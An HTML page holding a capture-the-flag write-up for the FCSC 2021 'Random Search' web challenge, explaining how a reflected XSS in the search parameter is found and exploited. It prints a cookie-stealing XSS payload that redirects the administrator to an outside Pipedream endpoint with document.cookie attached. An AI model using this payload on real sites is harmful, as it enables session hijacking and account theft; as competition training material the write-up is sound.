<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Random Search</title>
        <link rel="icon" type="image/x-icon" href="../../assets/img/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet" type="text/css" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="../../css/styles.css" rel="stylesheet" /><!--change path if file has been moved to another folder-->
    </head>
    <body id="page-top">
        <!-- Navigation-->
        <nav class="navbar navbar-expand-xl navbar-dark bg-primary fixed-top" id="sideNav">
            <script src="/nav.js"></script>
        </nav>
        <!-- Page Content-->
        <div>
            <nav class="navbar navbar-expand-xl navbar-dark bg-header sticky-top">
            <h3 class="header-article"><a href="../../ctfpage.html">Capture The Flag </a>> <a href="../fcsc2021.html">FCSC 2021 </a>> Random Search</h3><!--change path if file has been moved to another folder-->
            </nav>
            
            <section class="article">
                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                    <div class="flex-grow-1">
                        <p>
                            <img src="img/randomsearch/subject.jpg" class="img-fluid" width="600">
                            The subject tells us to steal the administrator cookie. Stealing administrator cookie is usually linked with XSS.
                            <img src="img/randomsearch/webpage.jpg" class="img-fluid" width="600">
                            On the web page, we have a form, and a contact tab. Let's try to enter some javascript on the form to see if there is a XSS vulnerability.
                            <div class="squarebox">&ltscript&gtalert("nul")&lt/script&gt
                            </div>
                            <img src="img/randomsearch/xss.jpg" class="img-fluid" width="800">
                            The URL : http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=%3Cscript%3Ealert%28%22nul%22%29%3C%2Fscript%3E <br>
                            We see that the parameter search contains what we have put in the search bar. <br>
                            <br>
                            Let's check what we have in the contact tab. 
                            The contact tab displays another form, where you should enter a URL related to a search issue.
                            <img src="img/randomsearch/contact.jpg" class="img-fluid" width="700">
                            Therefore, if we modify the value of the search parameter by some JavaScript to redirect the administrator to a webpage that we control, we might retrieve the administrator cookie if the administrator clicks on the link that we will send through the contact form.<br>
                            <strong>Document.location</strong> is a JavaScript function that allows to redirect any user to any link. Let's redirect the administrator to my Pipedream endpoint and add the cookie of the administrator as the value of the cookie parameter with <strong>document.cookie</strong>.
                            <div class="squarebox">http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=&ltscript&gtdocument.location="https://96b66fa2d1f9a9492c5c3c21bfceece4.m.pipedream.net?cookie="+document.cookie;&lt/script&gt</div>
                            <img src="img/randomsearch/flag.jpg" class="img-fluid" width="700">
                        </p>

                    </div>
                </div>
            </section>
        </div>
        <!-- Bootstrap core JS-->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Third party plugin JS-->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
    </body>
</html>